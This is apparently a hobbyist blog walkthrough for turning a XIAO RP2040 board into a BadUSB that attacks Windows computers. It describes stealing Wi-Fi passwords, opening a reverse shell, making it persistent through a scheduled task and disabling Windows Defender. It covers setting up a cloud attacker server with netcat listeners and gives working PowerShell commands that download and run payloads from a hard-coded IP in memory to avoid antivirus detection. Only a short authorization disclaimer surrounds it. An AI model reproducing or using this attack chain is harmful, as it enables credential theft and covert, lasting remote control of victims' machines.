---
title: "XIAO RP2040 MALICIOUS USB."
date: 2026-02-01
tags: ["Usb", "malicious"]
author: "Fernandez"
summary: "Click to read the full walkthrough."
---


# ⚠️ DO NOT PLUG IN! ⚠️

![DANGER](https://img.shields.io/badge/DO%20NOT%20PLUG%20IN!-DANGER-red?style=for-the-badge)

> **This device is dangerous. Do not connect to power or any data ports.**  
> Unauthorized use may cause data loss, system compromise, or physical harm.

---

![XIAO RP2040](https://raw.githubusercontent.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/main/Images/xiao.jpeg)
![XIAO RP2040 Pins](https://raw.githubusercontent.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/main/Images/xiao_rp2040_pins.png)

# XIAO RP2040 MALICIOUS DRIVE

Hello guys, I go by the name **Fernandez**, but you can call me **CyberInkuei** 🥷😎  
This project is a **Bad USB simulation** built to showcase how simple-looking devices can become powerful tools for security testing, awareness, and defense.

The **Bad USB** functions as a **Human Interface Device (HID)**, allowing it to emulate a keyboard and execute keystrokes on a computer within seconds. While this capability is often abused for malicious purposes, it also makes Bad USB devices valuable tools for **security research, awareness, and attack simulation**.

For this project, we’ll be using the **XIAO RP2040** microcontroller as the foundation of our Bad USB build, which will be programmed using **CircuitPython**.

You can purchase the board from:
- [Seeed Studio](https://www.seeedstudio.com/XIAO-RP2040-v1-0-p-5026.html)
- [Microscale (Nigeria)](https://www.microscale.net/)

---

## Requirements

- XIAO RP2040
- A dedicated server (local system or hosted in the cloud)

I already have a dedicated server hosted in the cloud, which provides a public IP address and allows targets to connect from anywhere in the world. Some configuration is required, which will be covered later.

---

## Goal

The goal of this project is to:
- Exfiltrate Wi-Fi SSIDs and passwords
- Inject a backdoor to obtain a remote shell
- Schedule the backdoor as a task for persistence
- Disable Windows Defender

---

## Scripts

I wrote two scripts for similar purposes.

### `Base_run.py`
[View script](https://github.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/blob/main/Base_run.py)

- Exfiltrates Wi-Fi SSIDs and passwords
- Injects a backdoor for a remote shell
- Schedules persistence via task scheduler
- Opens a YouTube video as a distraction

### `uac_defender.py`
[View script](https://github.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/blob/main/uac_defender.py)

- Opens PowerShell with admin privileges
- Exfiltrates Wi-Fi SSIDs and passwords
- Injects a backdoor for a remote shell
- Schedules persistence
- Accepts UAC prompts and disables Windows Defender

The scripts are similar, but `uac_defender.py` includes UAC handling and Defender disablement.

---

## Setup

Navigate to [CircuitPython](https://circuitpython.org), select **Downloads**, and search for **XIAO RP2040**. and select the first one "RP2040"

<img width="1920" height="875" alt="Screenshot (59)" src="https://github.com/user-attachments/assets/64d9e929-46f9-4584-884b-fec0aa600928" />

Download the `.UF2` file
<img width="1920" height="955" alt="Screenshot (60)" src="https://github.com/user-attachments/assets/4914e0e9-6dfd-4baf-bf00-3dfe8a98a8a2" />

Now, it's time to plug in the board with a type c cable, but before that, hold the <b>B</b> button on the board for few seconds while at the same timme you plug in the device to the computer to factory reset it. The B button is located by the bottom right of the device in the image below
![XIAO RP2040](Images/xiao.jpeg)

After you have it plugged in, you should see it as a drive on your computer
<img width="1920" height="774" alt="Screenshot (61)" src="https://github.com/user-attachments/assets/12dc3070-2487-4145-858a-dbc1e7637e9d" />

Move the `adaruit.UF2` file we downloaded of recent to the drive. It is going to disconnect and restart itself after moving it.
<img width="1200" height="246" alt="Screenshot (62)" src="https://github.com/user-attachments/assets/7138cf57-3c98-4c13-a85d-85d4d16c33c2" />

After restarting, you would have something like this:
<img width="1747" height="796" alt="Screenshot (67)" src="https://github.com/user-attachments/assets/6b68389d-cc53-45a2-8cf8-c87e82cb9ec7" />

Next, go to the library file we downloaded `adafruit-circuitpython-bundle-10.x-mpy-20260124` and extract the content. Once you're done navigate to the `lib` directory in it and look for the folder `adafruit_hid` <img width="1725" height="854" alt="Screenshot (69)" src="https://github.com/user-attachments/assets/0f4516e5-572a-4148-96d8-aba22640a671" />

Then copy the folder to the lib directory in the XAIO RP2040 drive.
<img width="1912" height="819" alt="Screenshot (70)" src="https://github.com/user-attachments/assets/9edbda1f-ff17-47ff-a3ad-4b36fc21fd11" />

Going back to the root of the XAIO RP2040, you will see python script, this is where our code would be stored and that's where we do the programming. I have it programmed for you already, so you can just replace the python script with the one I've written and modify the ip address and anything that needs to modified to match your environment. Also make sure the script is renamed to `code.py`
<img width="1747" height="796" alt="Screenshot (67)" src="https://github.com/user-attachments/assets/6b68389d-cc53-45a2-8cf8-c87e82cb9ec7" />

Before we continue, let's see the config on the attacker server running in the cloud.

# Attacker Server #
We would like our attack to be successful irrespective of the network the target is on and wherever he is in the world. We don't want a situation whereby it only works when we are within the same network, therefore, I provisioned a server already in the cloud that listens for inbound and outbound connections with an available public IP Address.

You can come here [EC2 Server](https://us-east-1.console.aws.amazon.com/) to create a cloud Instance in AWS.

After creating an instance, navigate to security groups and configure an inbound allow rule for these ports and also an outbound for all ports

INBOUND:
<img width="1618" height="298" alt="Screenshot (73)" src="https://github.com/user-attachments/assets/d06b2b8f-9f90-4a3b-b76b-8c5762766ef5" />

<img width="1628" height="278" alt="Screenshot (74)" src="https://github.com/user-attachments/assets/7fba9caa-05ca-4b9b-988e-ae7478acff4b" />

OOUTBOUND:
<img width="1649" height="235" alt="Screenshot (75)" src="https://github.com/user-attachments/assets/1b3d0854-d030-41be-bec2-5b0c9179c640" />

Why we need the ports?

5555 - Our server will use this to listen for wifi credentials

3333 - To listen for a reverse connection.

22 - We use this to remotely connect to our machine

443 - HTTPS

53 - DNS(Should be open)

80 - To host our reverse shell

(Ignore port 4444).

After configuring our firewall rules, we can now start the instance and login to the machine. We need to do a few things inside the machine to make the attack standout. Let's take them one after the other.

Firstly, create a directory in your /home/user/<directory name>, and copy the [Revshell.ps1](https://github.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/blob/main/ReverseShell.ps1) and [Wifilogger.ps1](https://github.com/JustFernandezz/MALICIOUS-USB_XIAO-RP2040_/blob/main/Wifilogger.ps1) files there. We would be hosting these files publicly and let the target execute it in memory without having to download locally(It runs pretty fast without AV detection), using IEX and IWR, which are some Living Off The Land Binaries (LOLBAS). We also don't want our entire filesystem to be publicly exposed, so we create a sub directory where we puth these files.

Like I have done here, the files are in a directory named `connect`.
<img width="1366" height="120" alt="Screenshot (76)" src="https://github.com/user-attachments/assets/0f3b04db-293b-4974-b201-ae922b762c98" />

That being said, modify the ip address of those files to match your instance ip and we are done with the first stage.

Next thing is to install tmux, tmux helps us to hold multiple terminal sessions without tearing down the session. Normally, whenever you run a program such as `python3 -m http.server` or anything that requires an active session, whenever you close the terminal, everything tears down, but with tmux, it let's your program keep running even when you close the terminal, and it provides a way to interact with each sessions you hold. 

You can install tmux with the following commands:

<li>sudo apt update</li>

<li>sudo apt install tmux</li>

For testing, run: `tmux new-s -d -s pythonserver1`, which creates a new tmux session titled pythonserver1. new-s or new-session creates a new session.

We can see the list all of the active sessions using `tmux list-s`. To interact with each session, type `tmux attach -t <session name>`, in our case pythonserver1, so it's going to be `tmux attach -t pythonserver1`.

To opt out of the session without tearing it down, you press `CTR + B + D`, which keeps your program running in a background and you can close the terminal. Also if you want to quit the session or tear it down, just press `CTR + C`, then the session ends.

We will be using netcat to listen for reverse connections from the target, and by default, netcat tears down sessions after one successful connection. Also, running netcat as a cronjob does not run in the foreground, so there's no way you can interact with each session, and that's not what we want as a creative attacker. We need tmux for that.

We want to add a cronjob that creates a netcat connection with tmux that listens for wifi credentials and stores it in a file named `wificreds` in your home directory, and also listens for a reverse shell every 1 minute even after tear down. With this, even if the netcat connection stops, it reconnects back after every 1 minute to listen for new connections.
<img width="1468" height="179" alt="Screenshot (78)" src="https://github.com/user-attachments/assets/df86c81e-daf3-45cf-95ca-75a52ff0659b" />

Finally, we can host a python server in the directory where we have our reverse shell and wifilogger scripts:

<img width="1920" height="900" alt="Screenshot (82)" src="https://github.com/user-attachments/assets/8c28c7df-fd2d-4bcf-a8c7-99c4bd1d6ef3" />
<img width="1920" height="579" alt="Screenshot (83)" src="https://github.com/user-attachments/assets/c70ce943-35f0-4aa6-b44f-dd5ff5810ac6" />

Press `CTR + B + D` to detach from the session.

⚠️ Make sure you don't have any sensitive file in that directory before hosting public, and make sure you have your services very secure. 

Now, visit your EC2 public ip address in the browser, and you should see the files being hosted in the public. So in our malicious script, the target would execute this line `'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'`, which visits our public ip and executes the powershell script in memory, that's why we need to host the files in public to be reachable. You can leave your server running in the cloud for days or weeks, The free tier offers 600 hours of free service I think.

Plug the drive into a nearby computer (this executes in less than six seconds), then return to your cloud instances, you should have a shell by now. Even if the target disconnects or there’s a break in the connection, don’t panic. The following line within the code

schtasks /create /tn "RunReversePowerShell" /tr "cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (iwr 'http://52.202.38.242/reverse.ps1')\"" /sc minute /mo 5 /it /f

already schedules the reverse shell to run on the target system every five minutes whenever the system is powered on. Remember that your Netcat listener should start listening one minute before the scheduled connection attempt. With this, we've maintained persistence, meaning you should receive a reverse shell from the target every five minutes, from anywhere in the world, at any time.

⚠️Always Remember: This technique is intended strictly for authorized security testing, research, or educational purposes. Only use it on systems you own or have explicit permission to test. Unauthorized access, persistence mechanisms, or monitoring of systems may be illegal and unethical, and could result in serious legal consequences.

<h2>Goodbye Folks. Until we meet again.</h2>


